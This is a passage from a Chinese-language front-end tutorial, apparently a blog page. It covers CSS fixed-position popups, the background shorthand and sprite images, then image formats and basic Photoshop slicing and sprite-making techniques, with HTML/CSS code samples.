class="number">480px</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class="menu"&gt;菜单文字&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>3、相对于浏览器窗口水平垂直居中的弹框</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">    <span class="selector-class">.menu</span>&#123;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">80px</span>;</span><br><span class="line">        <span class="attribute">background-color</span>: gold;</span><br><span class="line">        <span class="attribute">position</span>: fixed;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">960px</span>;</span><br><span class="line">        <span class="attribute">top</span>: <span class="number">0px</span>;</span><br><span class="line">        <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">        <span class="attribute">margin-left</span>: -<span class="number">480px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-tag">p</span>&#123;</span><br><span class="line">        <span class="attribute">text-align</span>: center;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.popup</span>&#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">500px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">        <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">        <span class="attribute">background-color</span>: <span class="number">#ffffff</span>;</span><br><span class="line">        <span class="attribute">position</span>: fixed;</span><br><span class="line">        <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">        <span class="attribute">margin-left</span>: -<span class="number">251px</span>;</span><br><span class="line">        <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">        <span class="attribute">margin-top</span>: -<span class="number">151px</span>;</span><br><span class="line">        <span class="attribute">z-index</span>: <span class="number">9999</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.popup</span> <span class="selector-tag">h2</span>&#123;</span><br><span class="line">        <span class="attribute">background-color</span>: gold;</span><br><span class="line">        <span class="attribute">margin</span>: <span class="number">10px</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">40px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.mask</span>&#123;</span><br><span class="line">        <span class="attribute">position</span>: fixed;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">        <span class="attribute">background-color</span>: grey;</span><br><span class="line">        <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="comment">/*透明度*/</span></span><br><span class="line">        <span class="attribute">opacity</span>: <span class="number">0.5</span>;</span><br><span class="line">        <span class="attribute">z-index</span>: <span class="number">9998</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.popup</span>&#123;</span><br><span class="line">        <span class="attribute">display</span>: block;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class="menu"&gt;菜单文字&lt;/div&gt;</span><br><span class="line">&lt;div class="pop_con"&gt;</span><br><span class="line">    &lt;div class="popup"&gt;</span><br><span class="line">        &lt;h2&gt;弹框的标题&lt;/h2&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class="mask"&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;网页内容&lt;/p&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;p&gt;网页内容&lt;/p&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;p&gt;网页内容&lt;/p&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br></pre></td></tr></table></figure><h2 id="3-12-background属性"><a href="#3-12-background属性" class="headerlink" title="3.12 background属性"></a>3.12 background属性</h2><h3 id="3-12-1-属性解释"><a href="#3-12-1-属性解释" class="headerlink" title="3.12.1 属性解释"></a>3.12.1 <strong>属性解释</strong></h3><p>background属性是css中应用比较多，且比较重要的一个属性，它是负责给盒子设置背景图片和背景颜色的，background是一个复合属性，它可以分解成如下几个设置项：</p><ul><li>background-color 设置背景颜色</li><li>background-image 设置背景图片地址</li><li>background-repeat 设置背景图片如何重复平铺</li><li>background-position 设置背景图片的位置</li><li>background-attachment 设置背景图片是固定还是随着页面滚动条滚动</li></ul><p>实际应用中，我们可以用background属性将上面所有的设置项放在一起，而且也建议这么做，这样做性能更高，而且兼容性更好，比如：“background: #00FF00 url(bgimage.gif) no-repeat left center fixed”，这里面的“#00ff00”是设置background-color；“url(bgimage.gif)”是设置background-image；“no-repeat”是设置background-repeat；“left center”是设置background-position；“fixed”是设置background-attachment，各个设置项用空格隔开，有的设置项不写也是可以的，它会使用默认值。</p><h3 id="3-12-2-举例"><a href="#3-12-2-举例" class="headerlink" title="3.12.2 举例"></a>3.12.2 <strong>举例</strong></h3><p>下面这些例子使用下面这张图片做为背景图：<br><img src="/qianduan_images/017.jpg" alt="background示例图片"></p><p>1、“background:url(bg.jpg)”，默认设置一个图片地址，图片会从盒子的左上角开始将盒子铺满。</p><p><img src="/qianduan_images/018.jpg" alt="background示例图片"></p><p>2、“background:cyan url(bg.jpg) repeat-x”，横向平铺盒子，盒子其他部分显示背景颜色“cyan”。</p><p><img src="/qianduan_images/019.jpg" alt="background示例图片"></p><p>3、“background:cyan url(bg.jpg) repeat-y”，纵向平铺盒子，盒子其他部分显示背景颜色“cyan”。</p><p><img src="/qianduan_images/020.jpg" alt="background示例图片"></p><p>4、“background:cyan url(bg.jpg) no-repeat”，背景不重复，背景和盒子左上角对齐，盒子其他部分显示背景颜色“cyan”。</p><p><img src="/qianduan_images/021.jpg" alt="background示例图片"></p><p>5、“background:cyan url(bg.jpg) no-repeat left center”，背景不重复，背景和盒子左中对齐，盒子其他部分显示背景颜色“cyan”。</p><p><img src="/qianduan_images/022.jpg" alt="background示例图片"></p><p>6、“background:cyan url(bg.jpg) no-repeat right center”，背景不重复，背景和盒子右中对齐，也就是背景图片的右边对齐盒子的右边，盒子其他部分显示背景颜色“cyan”。</p><p><img src="/qianduan_images/023.jpg" alt="background示例图片"></p><p>相关代码：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="selector-tag">DOCTYPE</span> <span class="selector-tag">html</span>&gt;</span><br><span class="line">&lt;html lang="en"&gt;</span><br><span class="line">&lt;<span class="selector-tag">head</span>&gt;</span><br><span class="line">    &lt;meta charset="UTF-8"&gt;</span><br><span class="line">    &lt;title&gt;test background&lt;/title&gt;</span><br><span class="line">    &lt;style type="text/css"&gt;</span><br><span class="line">        <span class="selector-class">.backshow</span>&#123;</span><br><span class="line">            <span class="attribute">width</span>:<span class="number">320px</span>;</span><br><span class="line">            <span class="attribute">height</span>:<span class="number">160px</span>;</span><br><span class="line">            <span class="attribute">border</span>:<span class="number">3px</span> solid <span class="number">#333</span>;</span><br><span class="line">            <span class="attribute">float</span>:left;</span><br><span class="line">            <span class="attribute">margin</span>:<span class="number">10px</span>;            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="selector-class">.bg1</span>&#123;<span class="attribute">background</span>:cyan <span class="built_in">url</span>(bg.jpg);&#125;</span><br><span class="line">        <span class="selector-class">.bg2</span>&#123;<span class="attribute">background</span>:cyan <span class="built_in">url</span>(bg.jpg) repeat-x;&#125;</span><br><span class="line">        <span class="selector-class">.bg3</span>&#123;<span class="attribute">background</span>:cyan <span class="built_in">url</span>(bg.jpg) repeat-y;&#125;</span><br><span class="line">        <span class="selector-class">.bg4</span>&#123;<span class="attribute">background</span>:cyan <span class="built_in">url</span>(bg.jpg) no-repeat;&#125;</span><br><span class="line">        <span class="selector-class">.bg5</span>&#123;<span class="attribute">background</span>:cyan <span class="built_in">url</span>(bg.jpg) no-repeat left center;&#125;</span><br><span class="line">        <span class="selector-class">.bg6</span>&#123;<span class="attribute">background</span>:cyan <span class="built_in">url</span>(bg.jpg) no-repeat right center;&#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;<span class="selector-tag">body</span>&gt;</span><br><span class="line">    &lt;div class="backshow bg1"&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class="backshow bg2"&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class="backshow bg3"&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class="backshow bg4"&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class="backshow bg5"&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class="backshow bg6"&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>例子说明：</p><p>background-position的设置，可以在水平方向设置“left”、“center”、“right”，在垂直方向设置“top”、“center”、“bottom”，除了设置这些方位词之外，还可以设置具体的数值。</p><p>比如说，我们想把下边的盒子用右边的图片作为背景，并且让背景显示图片中靠近底部的那朵花：<br><img src="/qianduan_images/024.jpg" alt="background示例图片"><br>用上面中间那张图片作为左边那个比它尺寸小的盒子的背景，上面右边的实现效果设置为：“background:url(location_bg.jpg) -110px -150px”，第一个数值表示背景图相对于自己的左上角向左偏移110px，负值向左，正值向右，第二个数值表示背景图相对于自己的左上角向上偏移150px，负值向上，正值向下。</p><p>实现原理示意图：<br><img src="/qianduan_images/025.jpg" alt="background示例图片"></p><p>对应代码：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="selector-tag">DOCTYPE</span> <span class="selector-tag">html</span>&gt;</span><br><span class="line">&lt;html lang="en"&gt;</span><br><span class="line">&lt;<span class="selector-tag">head</span>&gt;</span><br><span class="line">    &lt;meta charset="UTF-8"&gt;</span><br><span class="line">    &lt;title&gt;test background&lt;/title&gt;</span><br><span class="line">    &lt;style type="text/css"&gt;</span><br><span class="line">        <span class="selector-class">.backshow</span>&#123;</span><br><span class="line">            <span class="attribute">width</span>:<span class="number">320px</span>;</span><br><span class="line">            <span class="attribute">height</span>:<span class="number">160px</span>;</span><br><span class="line">            <span class="attribute">border</span>:<span class="number">3px</span> solid <span class="number">#333</span>;</span><br><span class="line">            <span class="attribute">float</span>:left;</span><br><span class="line">            <span class="attribute">margin</span>:<span class="number">10px</span>;            </span><br><span class="line">        &#125;        </span><br><span class="line">        <span class="selector-class">.bg</span>&#123;<span class="attribute">width</span>:<span class="number">94px</span>;</span><br><span class="line">            <span class="attribute">height</span>:<span class="number">94px</span>;</span><br><span class="line">            <span class="attribute">border</span>:<span class="number">3px</span> solid <span class="number">#666</span>;</span><br><span class="line">            <span class="attribute">background</span>:<span class="built_in">url</span>(location_bg.jpg) -<span class="number">110px</span> -<span class="number">150px</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;<span class="selector-tag">body</span>&gt;</span><br><span class="line">    &lt;div class="bg"&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>理解练习：<br>通过雪碧图制作如下布局：</p><p><img src="/qianduan_images/026.jpg" alt="background示例图片"></p><h2 id="3-13-特征布局实例讲习"><a href="#3-13-特征布局实例讲习" class="headerlink" title="3.13 特征布局实例讲习"></a>3.13 特征布局实例讲习</h2><p>经过对前面知识点的巩固和加深，我们可以使用前面学习到的知识来制作实际开发中碰到的一些典型的布局，以此来达到综合应用知识的目的。</p><p>1、特征布局：翻页（所需知识点：盒模型、内联元素）</p><p><img src="/qianduan_images/027.jpg" alt="布局示例图片"></p><p>2、特征布局：导航条01（所需知识点：盒模型、行内元素布局）</p><p><img src="/qianduan_images/028.jpg" alt="布局示例图片"></p><p>3、特征布局：导航条02（所需知识点：盒模型、浮动、定位、字体对齐）</p><p><img src="/qianduan_images/029.jpg" alt="布局示例图片"></p><p>4、特征布局：图片列表（所需知识点：盒模型、浮动）</p><p><img src="/qianduan_images/030.jpg" alt="布局示例图片"></p><p>5、特征布局：新闻列表（所需知识点：盒模型、浮动）</p><p><img src="/qianduan_images/031.jpg" alt="布局示例图片"></p><p><strong>课后练习</strong></p><p><img src="/qianduan_images/032.jpg" alt="布局示例图片"></p><p><img src="/qianduan_images/033.jpg" alt="布局示例图片"></p><h1 id="4-Photoshop"><a href="#4-Photoshop" class="headerlink" title="4. Photoshop"></a>4. Photoshop</h1><h2 id="4-1-常用图片格式"><a href="#4-1-常用图片格式" class="headerlink" title="4.1 常用图片格式"></a>4.1 常用图片格式</h2><p>图片是网页制作中很重要的素材，图片有不同的格式，每种格式都有自己的特性，了解这些特效，可以方便我们在制作网页时选取适合的图片格式，图片格式及特性如下：</p><p><strong>1、psd</strong><br>photoshop的专用格式。<br>优点：完整保存图像的信息，包括未压缩的图像数据、图层、透明等信息，方便图像的编辑。<br>缺点：应用范围窄，图片容量相对比较大。</p><p><strong>2、jpg</strong><br>网页制作及日常使用最普遍的图像格式。<br>优点：图像压缩效率高，图像容量相对最小。<br>缺点：有损压缩，图像会丢失数据而失真，不支持透明背景，不能制作成动画。</p><p><strong>3、gif</strong><br>制作网页小动画的常用图像格式。<br>优点：无损压缩，图像容量小、可以制作成动画、支持透明背景。<br>缺点：图像色彩范围最多只有256色，不能保存色彩丰富的图像，不支持半透明，透明图像边缘有锯齿。</p><p><strong>4、png</strong><br>网页制作及日常使用比较普遍的图像格式。<br>优点：无损压缩，图像容量小、支持透明背景和半透明色彩、透明图像的边缘光滑。<br>缺点：不能制作成动画</p><p><strong>5、webp</strong><br>将要取代jpg的图像格式。<br>优点：同jpg格式，容量相对比jpg还要小。<br>缺点：同jpg格式，目前不支持所有的浏览器。</p><p><strong>位图和矢量图</strong><br>位图也叫点阵图，是由一个个的方形的像素点排列在一起拼接而成的，位图在放大时，图像会失真。上面讲的5种图像都属于位图。<br>矢量图和位图组成图像的原理不同，它的图像轮廓是由函数曲线生成的，当放大图像时，实际的原理就是将曲线乘以一个倍数，图像可以轻易地放大，而且不会出现像素块，图像边缘也不会出现锯齿。</p><p><strong>svg</strong><br>目前首选的网页矢量图格式。<br>优点：图像容量小、图像放大不失真、支持透明背景和半透明色彩、图像边缘光滑。<br>缺点：色彩不够丰富。</p><p><strong>flash</strong><br>退出历史的重量级网页矢量图格式。<br>优点：图像容量小、图像放大不失真、支持透明背景和半透明色彩、图像边缘光滑、还可以制作动画、可编写交互。<br>缺点：不支持搜索引擎、运行慢、浏览器需要装插件才可支持。</p><p><strong>总结</strong><br>在网页制作中，如何选择合适的图片格式呢？<br>1、使用大幅面图片时，如果要使用不透明背景的图片，就使用jpg图片；如果要使用透明或者半透明背景的图片，就使用png图片；<br>2、使用小幅面图片或者图标图片时，如果图片含多种颜色，可以使用gif或png图片；如果图片是单色，而且要求有很好的显示效果，可以使用svg；如果是图片时动画的，可以使用gif。</p><h2 id="4-2-photoshop常用图片处理技巧"><a href="#4-2-photoshop常用图片处理技巧" class="headerlink" title="4.2 photoshop常用图片处理技巧"></a>4.2 photoshop常用图片处理技巧</h2><p>photoshop是一款优秀的图像处理软件，作为前端开发工程师，掌握它的一些常用功能是必须的。photoshop的常用功能有：选择、裁剪图像、修图、取色、插入文字等等。除了这些常用功能，前端还需要掌握制作新图像、切图等技巧。本次讲解的photoshop版本为cs6。</p><h3 id="4-2-1-图片格式转换与压缩"><a href="#4-2-1-图片格式转换与压缩" class="headerlink" title="4.2.1 图片格式转换与压缩"></a>4.2.1 <strong>图片格式转换与压缩</strong></h3><p>1、文件/存储为 选择图片类型以及压缩比；（不推荐）<br>2、文件/存储为web所用格式 选择图片类型以及压缩比 （推荐）；</p><h3 id="4-2-2-图像放缩，平移"><a href="#4-2-2-图像放缩，平移" class="headerlink" title="4.2.2 图像放缩，平移"></a>4.2.2 <strong>图像放缩，平移</strong></h3><p>1、<img src="/qianduan_images/icons/001.jpg" alt="ps软件示例图片"> 放缩工具 图像放大缩小，在图像上点击放大，按住alt键点击缩小，快捷键Ctrl+“+”放大 Ctrl+“-”缩小，双击此工具可以让图像按照原始大小显示。</p><p>2、<img src="/qianduan_images/icons/002.jpg" alt="ps软件示例图片"> 平移工具 对图像进行移动，在使用其他工具时，按住空格键盘的空格键，可以切换到此工具，移动完后松开空格键回到原来的工具。双击此工具可以让图像放缩到显示区域完全显示。</p><h3 id="4-2-3-新建图像"><a href="#4-2-3-新建图像" class="headerlink" title="4.2.3 新建图像"></a>4.2.3 <strong>新建图像</strong></h3><p>执行菜单命令 文件/新建 可以新建一张图片，设置大小，颜色模式选RGB，网页图片一般选择72像素/英寸，如果图像要打印，可设为300/英寸。背景按情况选透明或白色。</p><h3 id="4-2-4-移动选择与图层面板"><a href="#4-2-4-移动选择与图层面板" class="headerlink" title="4.2.4 移动选择与图层面板"></a>4.2.4 <strong>移动选择与图层面板</strong></h3><p>1、按住Ctrl，在图像上点击可以选中图层<br>2、<img src="/qianduan_images/icons/003.jpg" alt="ps软件示例图片"> 选择此工具，勾选工具属性栏上的“自动选择图层”，可以在图像上点击选中图层<br>3、移动元素同时按住Alt键可复制一个图层<br>4、图层面板的操作，包括图层的显示隐藏、图层顺序、新建图层、图层删除</p><h3 id="4-2-5-针对图像中选中图层的操作"><a href="#4-2-5-针对图像中选中图层的操作" class="headerlink" title="4.2.5 针对图像中选中图层的操作"></a>4.2.5 <strong>针对图像中选中图层的操作</strong></h3><p>1、移动<br>2、自由变换 执行菜单命令 编辑/自由变换<br>3、拖拽到另一张图像上完成图层拷贝</p><h3 id="4-2-6-历史记录面板"><a href="#4-2-6-历史记录面板" class="headerlink" title="4.2.6 历史记录面板"></a>4.2.6 <strong>历史记录面板</strong></h3><p>记录20部操作，可以点击已经记录的操作步骤回到之前</p><h3 id="4-2-7-选择工具"><a href="#4-2-7-选择工具" class="headerlink" title="4.2.7 选择工具"></a>4.2.7 <strong>选择工具</strong></h3><p>1、<img src="/qianduan_images/icons/004.jpg" alt="ps软件示例图片"> 矩形选择工具<br>2、<img src="/qianduan_images/icons/005.jpg" alt="ps软件示例图片"> 椭圆选择工具 按住alt+shift键可以从中心拉出正圆<br>3、<img src="/qianduan_images/icons/006.jpg" alt="ps软件示例图片"> 任意套索工具 用手任意画出选区，不精确，不常用<br>4、<img src="/qianduan_images/icons/007.jpg" alt="ps软件示例图片"> 多边形套索 可以选择多边形物体，对于结构复杂的物体，可以点多个小段来选择。<br>5、<img src="/qianduan_images/icons/008.jpg" alt="ps软件示例图片"> 磁性套索 可以自动在物体边缘生成选择线，但是由于太自动了，所以不够精确，也不常用。<br>6、<img src="/qianduan_images/icons/010.jpg" alt="ps软件示例图片"> 魔术棒选择工具 按照点击的点的颜色范围来选择，可以设置范围的容差，容差越大，选择区域越大，对于有单色背景的图像中的元素，可以用它点选背景，然后反选，从而选中元素。<br>7、<img src="/qianduan_images/icons/009.jpg" alt="ps软件示例图片"> 快速选择工具 直接在要选的元素上画，按照画的颜色范围进行选择。<br>8、对图层创建选区：按住Ctrl，用鼠标点击图层面板中图层的图标，在图层外框生成选区。</p><h3 id="4-2-8-选区的编辑技巧"><a href="#4-2-8-选区的编辑技巧" class="headerlink" title="4.2.8 选区的编辑技巧"></a>4.2.8 <strong>选区的编辑技巧</strong></h3><p>1、新选区模式下移动选区<br>2、选区的加、减、乘，工具属性栏上设置<br>3、调整边缘 工具属性栏或者执行菜单命令 选择/调整边缘<br>4、变换选区 执行菜单命令 选择/变换选区，可对选区进行缩放、移动等<br>5、反选 执行菜单命令 选择/反向<br>6、取消选择 执行菜单命令 选择/取消选择，快捷键ctrl+d</p><h3 id="4-2-9-选区特别注意"><a href="#4-2-9-选区特别注意" class="headerlink" title="4.2.9 选区特别注意"></a>4.2.9 <strong>选区特别注意</strong></h3><p>选区（蚂蚁线）只对当前图层器起作用，选区操作失败一般是当前图层弄错了</p><h3 id="4-2-10-裁剪图像"><a href="#4-2-10-裁剪图像" class="headerlink" title="4.2.10 裁剪图像"></a>4.2.10 <strong>裁剪图像</strong></h3><p>1、<img src="/qianduan_images/icons/011.jpg" alt="ps软件示例图片"> 裁切工具<br>2、对选区执行菜单命令 图像/裁剪<br>3、设置矩形框大小，创建固定宽高的矩形框，可进行固定尺寸裁剪</p><h3 id="4-2-11-针对确定选区的操作技巧"><a href="#4-2-11-针对确定选区的操作技巧" class="headerlink" title="4.2.11 针对确定选区的操作技巧"></a>4.2.11 <strong>针对确定选区的操作技巧</strong></h3><p>1、复制 执行菜单命令 编辑/拷贝 快捷键ctrl+c<br>2、粘贴 执行菜单命令 编辑/粘贴 快捷键ctrl+v<br>3、填充 执行菜单命令 编辑/填充<br>4、描边 执行菜单命令 编辑/描边<br>5、删除 执行菜单命令 编辑/清除 快捷键 delete<br>6、自由变换 执行菜单命令 编辑/自由变换 快捷键 ctrl+t</p><h3 id="4-2-12-擦除与修复工具"><a href="#4-2-12-擦除与修复工具" class="headerlink" title="4.2.12 擦除与修复工具"></a>4.2.12 <strong>擦除与修复工具</strong></h3><p>1、<img src="/qianduan_images/icons/016.jpg" alt="ps软件示例图片"> 擦除工具<br>2、<img src="/qianduan_images/icons/015.jpg" alt="ps软件示例图片"> 污点修复工具</p><h3 id="4-2-13-参考线技巧"><a href="#4-2-13-参考线技巧" class="headerlink" title="4.2.13 参考线技巧"></a>4.2.13 <strong>参考线技巧</strong></h3><p>1、视图/标尺，显示标尺，在标尺上按住鼠标拖动可以拉出参考线<br>2、视图/对齐到/参考线 让参考线移动时自动对齐到选框或者图像的边缘<br>3、视图/新建参考线 可以精确创建参考线</p><h3 id="4-2-14-文本输入"><a href="#4-2-14-文本输入" class="headerlink" title="4.2.14 文本输入"></a>4.2.14 <strong>文本输入</strong></h3><p>1、执行菜单命令 编辑/首选项/单位和标尺 设置文字的单位<br>2、<img src="/qianduan_images/icons/014.jpg" alt="ps软件示例图片"> 文本输入<br>3、文本编辑 属性工具栏上点击文本编辑按钮</p><h3 id="4-2-15-取色"><a href="#4-2-15-取色" class="headerlink" title="4.2.15 取色"></a>4.2.15 <strong>取色</strong></h3><p>1、<img src="/qianduan_images/icons/013.jpg" alt="ps软件示例图片">取色工具，点击前景色按钮，弹出取色对话框，当前工具切换成取色工具。<br>2、<img src="/qianduan_images/icons/017.jpg" alt="ps软件示例图片">点击前景色按钮，当前工具自动切换到取色工具</p><h3 id="4-2-16-图像大小与画布大小"><a href="#4-2-16-图像大小与画布大小" class="headerlink" title="4.2.16 图像大小与画布大小"></a>4.2.16 <strong>图像大小与画布大小</strong></h3><p>1、图像/图像大小 查看和设置图像的整体大小<br>2、图像/画布大小 查看和设置图像的画板大小</p><h3 id="4-2-17-尺寸测量"><a href="#4-2-17-尺寸测量" class="headerlink" title="4.2.17 尺寸测量"></a>4.2.17 <strong>尺寸测量</strong></h3><p>1、<img src="/qianduan_images/icons/012.jpg" alt="ps软件示例图片"> 切片工具 双击切片弹出切片对话框<br>2、<img src="/qianduan_images/icons/018.jpg" alt="ps软件示例图片"> 切片选择工具<br>2、<img src="/qianduan_images/icons/004.jpg" alt="ps软件示例图片"> 矩形框工具，打开信息面板</p><h2 id="4-3-photoshop批量切图技巧"><a href="#4-3-photoshop批量切图技巧" class="headerlink" title="4.3 photoshop批量切图技巧"></a>4.3 photoshop批量切图技巧</h2><p>切图，就是从效果图中把网页制作需要的小图片裁剪出来。</p><p>1、使用psd格式并且带有图层的图像切图</p><p>2、在图像上用切片工具切出需要的小图</p><p>3、双击切片，给切片命名</p><p>4、将需要制作透明背景图像的切片的背景隐藏</p><p>5、执行菜单命令 存储为web所用格式</p><p>6、点选切片，设置切片的图片格式</p><p>7、存储切片，选择“所有用户切片”，点存储(多个切片会自动存到所选文件夹中的images文件夹中)</p><h2 id="4-4-Photoshop制作雪碧图技巧"><a href="#4-4-Photoshop制作雪碧图技巧" class="headerlink" title="4.4 Photoshop制作雪碧图技巧"></a>4.4 Photoshop制作雪碧图技巧</h2><p>雪碧图，就是将网页制作中使用的多个小图片合并成一个图片，使用css技术将这张合成的图片应用在网页不同的地方，雪碧图可以减少网页加载时的http请求数，优化网页性能。</p><p>步骤：</p><p>1、使用Photoshop新建一张背景透明的图片</p><p>2、将小图片复制到此图片中，排列好每个图像的位置，图片幅面不够可以用画布大小调整大小</p><p>3、按照所有小图片的范围裁剪图片，存为透明背景的png图片</p><h1 